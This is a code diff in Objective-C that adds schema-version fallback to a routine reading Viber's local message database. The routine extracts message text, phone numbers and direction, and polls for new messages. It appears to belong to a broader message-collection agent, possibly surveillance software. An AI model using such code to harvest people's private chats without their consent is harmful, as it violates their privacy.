@@ -738,79 +738,85 @@ foundCharacters:(NSString *)string
   sqlite3_stmt *compiledStatement;
   NSNumber *type = [NSNumber numberWithInt:VIBER_TYPE]; // temporaneo: da mettere in db
   
-  char _wa_msg_query[] =
-  "select zvibermessage.z_pk, zvibermessage.ztext, zvibermessage.zstate, zphonenumberindex.zphonenum from zvibermessage inner join z_3phonenumindexes on z_3phonenumindexes.z_3conversations =  zvibermessage.zconversation inner join zphonenumberindex on zphonenumberindex.z_pk = z_3phonenumindexes.z_5phonenumindexes where zvibermessage.z_pk >";
+  char _wa_msg_query3[] = "select zvibermessage.z_pk, zvibermessage.ztext, zvibermessage.zstate, zphonenumberindex.zphonenum from zvibermessage inner join z_3phonenumindexes on z_3phonenumindexes.z_3conversations =  zvibermessage.zconversation inner join zphonenumberindex on zphonenumberindex.z_pk = z_3phonenumindexes.z_5phonenumindexes where zvibermessage.z_pk >";
   
-  sprintf(wa_msg_query, "%s %d", _wa_msg_query, theDate);
+  char _wa_msg_query4[] = "select zvibermessage.z_pk, zvibermessage.ztext, zvibermessage.zstate, zphonenumberindex.zphonenum from zvibermessage inner join z_4phonenumindexes on z_4phonenumindexes.z_4conversations =  zvibermessage.zconversation inner join zphonenumberindex on zphonenumberindex.z_pk = z_4phonenumindexes.z_6phonenumindexes where zvibermessage.z_pk >";
   
-  if(sqlite3_prepare_v2(theDB, wa_msg_query, -1, &compiledStatement, NULL) == SQLITE_OK)
+  sprintf(wa_msg_query, "%s %d", _wa_msg_query3, theDate);
+  
+  if(sqlite3_prepare_v2(theDB, wa_msg_query, -1, &compiledStatement, NULL) != SQLITE_OK)
   {
-    while(sqlite3_step(compiledStatement) == SQLITE_ROW)
+    sprintf(wa_msg_query, "%s %d", _wa_msg_query4, theDate);
+    
+    if(sqlite3_prepare_v2(theDB, wa_msg_query, -1, &compiledStatement, NULL) != SQLITE_OK)
+      return retArray;
+  }
+
+  while(sqlite3_step(compiledStatement) == SQLITE_ROW)
+  {
+    int pk = sqlite3_column_int(compiledStatement, VIBER_PK_POS);
+    
+    if (pk > mLastVbMsgPk)
     {
-      int pk = sqlite3_column_int(compiledStatement, VIBER_PK_POS);
+      mLastVbMsgPk = pk;
+      NSString *peer;
+      NSString *sndr;
       
-      if (pk > mLastVbMsgPk)
+      NSString *text = [self getSqlString:compiledStatement colNum:VIBER_TEXT_POS];
+      
+      if (text != nil)
       {
-        mLastVbMsgPk = pk;
-        NSString *peer;
-        NSString *sndr;
+        NSString *state =[self getSqlString:compiledStatement colNum:VIBER_STATE_POS];
         
-        NSString *text = [self getSqlString:compiledStatement colNum:VIBER_TEXT_POS];
-        
-        if (text != nil)
+        if ([state compare: @"delivered"] == NSOrderedSame || [state compare: @"send"] == NSOrderedSame)
         {
-          NSString *state =[self getSqlString:compiledStatement colNum:VIBER_STATE_POS];
-          
-          if ([state compare: @"delivered"] == NSOrderedSame || [state compare: @"send"] == NSOrderedSame)
-          {
-            flags = [NSNumber numberWithInt:0x00000001];
-            peer = [self getSqlString:compiledStatement colNum:VIBER_PHONE_POS];
-            sndr = mVbUsername;
-          }
-          else
-          {
-            flags = [NSNumber numberWithInt:0x00000000];
-            peer = mVbUsername;
-            sndr = [self getSqlString:compiledStatement colNum:VIBER_PHONE_POS];
-          }
-          
-          NSDictionary *tmpDict =
-          [NSDictionary dictionaryWithObjectsAndKeys:text,                      @"text",
-                                                     peer != nil ? peer : @" ", @"peers",
-                                                     sndr != nil ? sndr : @" ", @"sender",
-                                                     type,                      @"type",
-                                                     flags,                     @"flags",
-                                                     nil];
-          
-          if (retArray == nil)
-            retArray = [NSMutableArray arrayWithCapacity:0];
-          
-          [retArray addObject: tmpDict];
-          
+          flags = [NSNumber numberWithInt:0x00000001];
+          peer = [self getSqlString:compiledStatement colNum:VIBER_PHONE_POS];
+          sndr = mVbUsername;
         }
-      }
-      else if (pk == mLastVbMsgPk) // if pk == last pk multi chat detected (inner join return multi line)
-      {
-          NSDictionary *tmpDict = [retArray lastObject];
-          
-          NSString *newTmpPeer = [self getSqlString:compiledStatement colNum:VIBER_PHONE_POS];
-          
-          NSString *newPeer = [NSString stringWithFormat:@"%@, %@", [tmpDict objectForKey:@"peers"], newTmpPeer];
-          
-          NSDictionary *newTmpDict = [NSDictionary dictionaryWithObjectsAndKeys:[tmpDict objectForKey:@"text"] ,  @"text",
-                                      newPeer,                          @"peers",
-                                      [tmpDict objectForKey:@"sender"], @"sender",
-                                      [tmpDict objectForKey:@"type"],   @"type",
-                                      [tmpDict objectForKey:@"flags"],  @"flags",
-                                      nil];
-          
-          [retArray removeObject:tmpDict];
-          [retArray addObject:newTmpDict];
+        else
+        {
+          flags = [NSNumber numberWithInt:0x00000000];
+          peer = mVbUsername;
+          sndr = [self getSqlString:compiledStatement colNum:VIBER_PHONE_POS];
+        }
+        
+        NSDictionary *tmpDict =
+        [NSDictionary dictionaryWithObjectsAndKeys:text,                      @"text",
+                                                   peer != nil ? peer : @" ", @"peers",
+                                                   sndr != nil ? sndr : @" ", @"sender",
+                                                   type,                      @"type",
+                                                   flags,                     @"flags",
+                                                   nil];
+        
+        if (retArray == nil)
+          retArray = [NSMutableArray arrayWithCapacity:0];
+        
+        [retArray addObject: tmpDict];
+        
       }
     }
-    
-    sqlite3_finalize(compiledStatement);
+    else if (pk == mLastVbMsgPk) // if pk == last pk multi chat detected (inner join return multi line)
+    {
+        NSDictionary *tmpDict = [retArray lastObject];
+        
+        NSString *newTmpPeer = [self getSqlString:compiledStatement colNum:VIBER_PHONE_POS];
+        
+        NSString *newPeer = [NSString stringWithFormat:@"%@, %@", [tmpDict objectForKey:@"peers"], newTmpPeer];
+        
+        NSDictionary *newTmpDict = [NSDictionary dictionaryWithObjectsAndKeys:[tmpDict objectForKey:@"text"] ,  @"text",
+                                    newPeer,                          @"peers",
+                                    [tmpDict objectForKey:@"sender"], @"sender",
+                                    [tmpDict objectForKey:@"type"],   @"type",
+                                    [tmpDict objectForKey:@"flags"],  @"flags",
+                                    nil];
+        
+        [retArray removeObject:tmpDict];
+        [retArray addObject:newTmpDict];
+    }
   }
+  
+  sqlite3_finalize(compiledStatement);
   
   return retArray;
 }
